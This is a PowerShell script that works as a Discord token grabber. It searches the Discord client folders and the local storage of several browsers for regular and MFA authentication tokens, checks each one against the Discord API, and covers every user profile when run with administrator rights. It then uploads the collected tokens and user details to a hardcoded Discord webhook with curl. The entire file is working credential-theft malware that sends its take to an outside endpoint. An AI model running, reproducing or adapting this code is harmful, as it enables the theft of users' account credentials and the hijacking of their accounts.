$id=""
$tmpID=""
$user=""
$tmpTag=""
$basePath=""
$storagePath = "\Local Storage\leveldb"
$tmpUsr=""
$tmpUsrName=""
$tmpUsername=""
$emptyArr = @()
$split = ""
$__str =""
 $tokens_str = ""
 $installs_str = ""
# Declare the array that stores the grabbed tokens
$global:possibleTokens =$null

# Declare the array that stores the found Discord installations
$global:installs =$null


function checkTokens($path, $localAccount, $storageType) {
if ( Test-Path -LiteralPath "$path" ) {
    $global:installs += @([pscustomobject]@{Status="Found";Type="$storageType";"User Account"=$localAccount;"Path"="$path"})
    echo "Checking account : $localAccount"
    # Discord Stable is installed

    # Debug line to show that it is installed
    # Write-Output "stable ok"

    # Set the location to the Discord Stable dir
    Set-Location $path

    # Get the tokens
    $files = @(Get-ChildItem *.ldb) # Get all files ending with -ldb in the dir
    Foreach ($file in $files)
    {
        # Debug lines to show the filename and that it is searching for MFA tokens
        # Write-Output $file
        # Write-Output "Looking for MFA tokens"
        
        # Get MFA tokens
        # Searches the file with a pattern
        $mfa = Select-String -Path $file -Pattern "mfa\.[a-zA-Z0-9_-]{84}" -AllMatches | ForEach-Object { $_.Matches } | ForEach-Object { $_.Value }

        # Checks if the result is longer than 1
        if ($mfa.length -gt 1) {
            
            # Debug - show that we found a token
            # Write-Output "Found a token"
            # Write-Output "Checking token : "$mfa

            # Validate the token using the Discord API
            try {

                $r = Invoke-WebRequest https://discordapp.com/api/v6/users/@me `
                -Headers @{"Accept" = "application/json";"User-Agent" = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.308 Chrome/78.0.3904.130 Electron/7.3.2 Safari/537.36"; "Authorization" = $mfa} -UseBasicParsing -EV Err -EA SilentlyContinue

            } catch {

                # We wont use this for anything as it is most likely just the 403 error.
                # $_.Exception.Response.StatusCode.Value__
            }

            }

            # Checks if the status code is 200 - then get some info about the token (ID, Username, Tag)
            if ($r.statusCode -eq "200") 

            {

                # Debug - Show that we found a valid token
                # Write-Output "Valid token : "
                # Write-Output $mfa

                $tmpID = $r.content | ConvertFrom-Json | Select-Object id
                $tmpUsername = $r.content | ConvertFrom-Json | Select-Object username
                $tmpTag = $r.content | ConvertFrom-Json | Select-Object discriminator
                $user = $tmpUsername.username+"#"+$tmpTag.discriminator
                $id = $tmpID.id

                # Debug - Show the ID of the token
                # Write-Output "ID : " + $id

                # Add the token, and user info to the array
                $global:possibleTokens += @([pscustomobject]@{Type="MFA";Location="DiscordStable";Token=$mfa;User=$user;ID=$id;"User Account"=$localAccount})

            } else {

                # Debug - Show that it is an invalid token
                # Write-Output "invalid token"
                # Write-Output $mfa

            }

            # Reset the vars
            $id=""
            $tmpID=""
            $user=""
            $r=""

            # Debug -  Show that we are searching for normal tokens (Tokens without MFA)
            # Write-Output "Looking for normal tokens"

            # Get tokens without MFA - this is just the same as with the MFA tokens, but with another pattern

            $tkn = Select-String -Path $file -Pattern "[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}" -AllMatches | ForEach-Object { $_.Matches } | ForEach-Object { $_.Value }

            if ($tkn.length -gt 2) {

                # Write-Output "Found a token"
                # Write-Output "Checking token : "$tkn

                try {

                    $r = Invoke-WebRequest https://discordapp.com/api/v6/users/@me `
                    -Headers @{"Accept" = "application/json";"User-Agent" = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.308 Chrome/78.0.3904.130 Electron/7.3.2 Safari/537.36"; "Authorization" = $tkn} -UseBasicParsing -EV Err -EA SilentlyContinue
                } catch {

                     # $_.Exception.Response.StatusCode.Value__
            }

                }

                if ($r.statusCode -eq "200")

                {

                    $tmpID = $r.content | ConvertFrom-Json | Select-Object id
                    $tmpUsername = $r.content | ConvertFrom-Json | Select-Object username
                    $tmpTag = $r.content | ConvertFrom-Json | Select-Object discriminator
                    $user = $tmpUsername.username+"#"+$tmpTag.discriminator
                    $id = $tmpID.id

                    # Write-Output "Valid token : "
                    # Write-Output $mfa
                    # Write-Output "id : "$id

                    $global:possibleTokens += @([pscustomobject]@{Type="NO MFA";Location="DiscordStable";Token=$tkn;User=$user;ID=$id;"User Account"=$localAccount})

                    $r=""
                    $id=""
                    $tmpID=""
                    $user=""

                } else {

                    # Write-Output "invalid token"
                    # Write-Output $mfa

                    $r=""
                    $id=""
                    $tmpID=""
                    $user=""

                }
                $path=""
                $tmpUsrName=""
                
}
#END STABLE
} else {
    $global:installs += @([pscustomobject]@{Status="Not Found";Type="$storageType";"User Account"=$localAccount;"Path"="$path"})
    Write-Output "Path not found"
}
# return $possibleTokens, $installs
}
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Output "You are running with admin perms, therefore we're going to check for all users."

    Get-ChildItem 'HKLM:\Software\Microsoft\Windows NT\CurrentVersion\ProfileList' | ForEach-Object {
        $tmpUsr = $_.GetValue('ProfileImagePath')
        $tmpUsrName = $tmpUsr.replace("C:\Users\","")
        
        # Write-Output "Checking for user account : $tmpUsrName"
        
    $path = "C:\Users\$tmpUsrName\AppData\Roaming"
    $localPath = "C:\Users\$tmpUsrName\AppData\Local"
    $discordPaths = @(
    "$path\discord$storagePath",
    "$path\discordcanary$storagePath",
    "$path\discordptb$storagePath",
    "$path\Mozilla\Firefox\Profiles",
    "$path\Opera Software\Opera Stable\Local Storage\leveldb",
    "$localPath\Google\Chrome\User Data\Default\Local Storage\leveldb",
    "$localPath\Vivaldi\User Data\Default\Local Storage\leveldb",
    "$localPath\Yandex\YandexBrowser\User Data\Default\Local Storage\leveldb",
    "$localPath\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb",
    "$localPath\Microsoft\Edge\User Data\Default\Local Storage\leveldb"
    )
        if ($tmpUsrName -like "*\*") {
            # echo "$tmpUsrName contains \"
        }
    $discordPaths | ForEach-Object {
    # echo "Checking path: $_, $tmpUsrName"
    if ($tmpUsrName -like "*\*") {
    } else {
    $storageType = $_.replace("$tmpUsr\AppData\Roaming\","").replace("$storagePath","")
   checkTokens $_ $tmpUsrName $storageType
    # echo "$_, $tmpUsrName"
    }
 
 }
    }
   
} else {
    Write-Output "You are running without admin perms. So we can only access the current user."
    $path = "C:\Users\$env:UserName\AppData\Roaming"
    $localPath = "C:\Users\$env:UserName\AppData\Local"
    $discordPaths = @(
    "$path\discord$storagePath",
    "$path\discordcanary$storagePath",
    "$path\discordptb$storagePath",
    "$path\Mozilla\Firefox\Profiles",
    "$path\Opera Software\Opera Stable\Local Storage\leveldb",
    "$localPath\Google\Chrome\User Data\Default\Local Storage\leveldb",
    "$localPath\Vivaldi\User Data\Default\Local Storage\leveldb",
    "$localPath\Yandex\YandexBrowser\User Data\Default\Local Storage\leveldb",
    "$localPath\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb",
    "$localPath\Microsoft\Edge\User Data\Default\Local Storage\leveldb"
    )
    $discordPaths | ForEach-Object {
    echo "Checking path: $_"
   checkTokens $_ $env:userName
 }
}
 Write-Output $possibleTokens
 Write-Output $installs
 $installs | Out-File -FilePath "result.txt"
 $tokens_str = $possibleTokens | Out-String
 $tokens_str | Out-File -FilePath "tokens.txt"
 $installs_str = $installs | Out-String
 $WEBHOOK_URL="https://discordapp.com/api/webhooks/770253592253956097/tXc_uMoiJ839p0CLpFlywHqVfMpEjl00wQMbTEqLNhxEREethw1bP9XPgtrnDtmFoTAj"
 curl.exe -X POST -H "Content-Type: multipart/form-data" -F "file=@result.txt" $WEBHOOK_URL
 curl.exe -X POST -H "Content-Type: multipart/form-data" -F "file=@tokens.txt" $WEBHOOK_URL
